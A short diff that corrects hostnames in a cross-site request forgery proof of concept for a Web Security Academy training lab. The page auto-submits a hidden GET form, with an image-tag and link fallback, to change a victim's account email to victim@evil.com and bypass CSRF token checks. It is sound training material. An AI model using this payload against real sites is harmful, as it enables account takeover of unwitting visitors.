@@ -32,7 +32,7 @@ Cache-Control: no-store
 <!doctype html>
 <html>
   <body>
-    <form action="<lab-host>web-security-academy.net/my-account/change-email" method="GET">
+    <form action="https://<lab-host>.web-security-academy.net/my-account/change-email" method="GET">
       <input type="hidden" name="email" value="victim%40evil.com">
     </form>
     <script>document.forms[0].submit();</script>
@@ -44,15 +44,15 @@ Body:
 <html>
   <body>
     <!-- Auto-submit GET request that bypasses CSRF token enforcement -->
-    <form action="https://<lab-host>web-security-academy.net/my-account/change-email" method="GET">
+    <form action="https://<lab-host>.web-security-academy.net/my-account/change-email" method="GET">
       <input type="hidden" name="email" value="victim%40evil.com">
     </form>
     <script>document.forms[0].submit();</script>
 
     <!-- Fallback (works even with JS off): -->
-    <img src="https://<lab-host>web-security-academy.net/my-account/change-email?email=victim%40evil.com" style="display:none">
+    <img src="https://<lab-host>.web-security-academy.net/my-account/change-email?email=victim%40evil.com" style="display:none">
     <noscript>
-      <a href="https://<lab-host>web-security-academy.net/my-account/change-email?email=victim%40evil.com">Click here</a>
+      <a href="https://<lab-host>.web-security-academy.net/my-account/change-email?email=victim%40evil.com">Click here</a>
     </noscript>
   </body>
 </html>
